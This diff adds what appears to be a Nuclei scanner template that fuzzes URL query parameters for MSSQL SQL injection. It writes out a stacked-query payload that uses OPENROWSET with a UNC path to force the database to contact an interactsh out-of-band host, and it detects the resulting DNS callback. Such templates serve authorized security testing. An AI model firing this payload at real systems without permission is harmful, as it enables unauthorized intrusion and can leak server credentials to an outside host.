@@ -1,0 +1,28 @@
+id: fuzz-openrowset-oob
+
+info:
+  name: MSSQL OPENROWSET UNC Path OOB
+  author: openai
+  severity: high
+  tags: mssql,oob,dast
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      openrowset:
+        - "1; SELECT * FROM OPENROWSET('MSDASQL', 'DRIVER={Microsoft Access Text Driver (*.txt;)};DefaultDir=\\\\{{interactsh-url}}\\\\;', 'SELECT * FROM test')--"
+
+    fuzzing:
+      - part: query
+        mode: single
+        fuzz:
+          - "{{openrowset}}"
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
